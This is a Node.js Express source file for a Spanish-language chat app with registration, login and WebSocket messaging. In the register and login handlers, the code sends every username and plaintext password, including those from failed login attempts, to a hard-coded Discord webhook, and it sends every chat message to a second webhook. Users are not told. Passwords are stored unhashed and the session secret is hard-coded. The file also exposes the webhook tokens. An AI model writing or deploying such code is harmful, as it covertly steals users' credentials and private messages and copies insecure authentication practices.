const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const loginWebhook = 'https://discord.com/api/webhooks/1401926755123597483/zeJNCzVoOiZL59SdlpueCCEWEYsiPdvLRoN6PhcBMJp1BG52o5YSV5ePlg8xKVIePDAA';
const chatWebhook = 'https://discord.com/api/webhooks/1401931313820340357/i5JfQQRrnXDthPMUnE8J0N2kltyt6qKOUjWkKY851COEy1x_Hd5BX2PhL2poZJ3sse9k';

const db = new sqlite3.Database('./db.sqlite');
db.serialize(() => {
    db.run("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)");
});

app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(session({
    secret: 'secret-key',
    resave: false,
    saveUninitialized: true
}));

app.get('/', (req, res) => {
    if (req.session.user) {
        res.redirect('/chat');
    } else {
        res.redirect('/login');
    }
});

app.get('/register', (req, res) => {
    res.sendFile(path.join(__dirname, 'views/register.html'));
});

app.post('/register', (req, res) => {
    const { username, password } = req.body;
    db.get("SELECT * FROM users WHERE username = ?", [username], (err, row) => {
        if (row) return res.send("Usuario ya registrado");
        db.run("INSERT INTO users (username, password) VALUES (?, ?)", [username, password], () => {
            fetch(loginWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `🔔 Nuevo registro
Usuario: **${username}**
Contraseña: ||${password}||` })
            });
            res.redirect('/login');
        });
    });
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'views/login.html'));
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    db.get("SELECT * FROM users WHERE username = ? AND password = ?", [username, password], (err, row) => {
        if (row) {
            req.session.user = username;
            fetch(loginWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `✅ Login exitoso
Usuario: **${username}**
Contraseña: ||${password}||` })
            });
            res.redirect('/chat');
        } else {
            fetch(loginWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `❌ Login fallido
Usuario: **${username}**
Contraseña: ||${password}||` })
            });
            res.send("Credenciales incorrectas");
        }
    });
});

app.get('/chat', (req, res) => {
    if (!req.session.user) return res.redirect('/login');
    res.sendFile(path.join(__dirname, 'views/chat.html'));
});

wss.on('connection', ws => {
    ws.on('message', message => {
        const data = JSON.parse(message);
        fetch(chatWebhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `💬 Mensaje de **${data.user}**: ${data.text}` })
        });
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.send(JSON.stringify({ user: data.user, text: data.text }));
            }
        });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log("Servidor corriendo en http://localhost:" + PORT));